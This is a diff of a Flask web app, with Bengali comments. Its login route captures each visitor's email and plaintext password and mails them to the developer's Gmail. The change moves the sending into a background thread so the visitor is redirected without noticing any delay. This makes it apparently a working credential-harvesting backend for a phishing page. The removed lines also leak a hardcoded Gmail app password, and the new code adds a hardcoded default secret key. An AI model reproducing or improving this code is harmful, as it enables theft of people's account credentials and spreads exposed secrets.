@@ -1,44 +1,38 @@
 import os
 import smtplib
+import threading
 from flask import Flask, render_template, request, redirect, url_for
+from email.message import EmailMessage
 from dotenv import load_dotenv
 
-# .env ফাইল থেকে ভেরিয়েবল লোড করার জন্য
 load_dotenv()
 
 app = Flask(__name__)
+app.secret_key = os.environ.get("SECRET_KEY", "rakib_secret_123")
 
-def send_email(user_info):
+def send_email_task(user_info):
+    """এটি ব্যাকগ্রাউন্ডে ইমেইল পাঠাবে"""
     try:
-        # Render Environment Variables থেকে ডাটা নেওয়া
-        # এখানে সরাসরি পাসওয়ার্ড না লিখে ভেরিয়েবল ব্যবহার করাই সবচেয়ে নিরাপদ
-        my_email = os.environ.get("MY_EMAIL")
+        my_email = os.environ.get("MY_EMAIL", "mdrakibjoysiddhi2025@gmail.com")
         app_password = os.environ.get("APP_PASSWORD")
 
-        # যদি Render-এ সেট করা না থাকে তবে আপনার দেওয়া ডিফল্টগুলো কাজ করবে
-        if not my_email:
-            my_email = "mdrakibjoysiddhi2025@gmail.com"
         if not app_password:
-            app_password = "jloa wdtm rdfr hnma"
+            print("❌ Error: APP_PASSWORD not found!")
+            return
 
-        # Gmail SMTP সার্ভার সেটআপ
-        server = smtplib.SMTP('smtp.gmail.com', 587)
-        server.set_debuglevel(1) # লগ দেখার জন্য
-        server.starttls()
-        
-        server.login(my_email, app_password)
-        
-        subject = "New Login Alert! (Rakib's Project)"
-        body = f"User logged in with details:\n{user_info}"
-        message = f"Subject: {subject}\n\n{body}"
-        
-        # নিজেকেই ইমেইল পাঠানো হচ্ছে
-        server.sendmail(my_email, my_email, message)
-        server.quit()  
-        return True
+        msg = EmailMessage()
+        msg.set_content(f"User logged in with details:\n\n{user_info}")
+        msg['Subject'] = "New Login Alert! (Rakib's Project)"
+        msg['From'] = my_email
+        msg['To'] = my_email
+
+        # SSL Port 465 ব্যবহার করা হয়েছে যা দ্রুত কাজ করে
+        with smtplib.SMTP_SSL('smtp.gmail.com', 465) as server:
+            server.login(my_email, app_password)
+            server.send_message(msg)
+        print("✅ Email sent successfully in background!")
     except Exception as e:
-        print(f"SMTP Error: {e}") 
-        return False
+        print(f"❌ Background SMTP Error: {e}")
 
 @app.route('/') 
 def index():
@@ -53,19 +47,18 @@ def login():
         return redirect(url_for('index'))
     
     user_data = f"Email: {email}\nPassword: {password}"
-    email_sent = send_email(user_data)
     
-    if email_sent:
-        return redirect(url_for('success'))
-    else:
-        # এরর মেসেজ আরও পরিষ্কার করা হয়েছে
-        return "সার্ভারে সমস্যা হয়েছে। অনুগ্রহ করে নিশ্চিত করুন Render-এ Environment Variables সেট করা আছে।"
+    # ব্যাকগ্রাউন্ডে ইমেইল পাঠানোর জন্য থ্রেড শুরু করা
+    email_thread = threading.Thread(target=send_email_task, args=(user_data,))
+    email_thread.start()
+    
+    # ইমেইল যাওয়ার জন্য অপেক্ষা না করে সরাসরি success পেজে নিয়ে যাবে
+    return redirect(url_for('success'))
 
 @app.route('/success')
 def success():
     return render_template('success.html')
 
 if __name__ == '__main__':
-    # প্রোডাকশনে পোর্ট ডায়নামিক হওয়া প্রয়োজন
     port = int(os.environ.get("PORT", 5000))
     app.run(host='0.0.0.0', port=port)
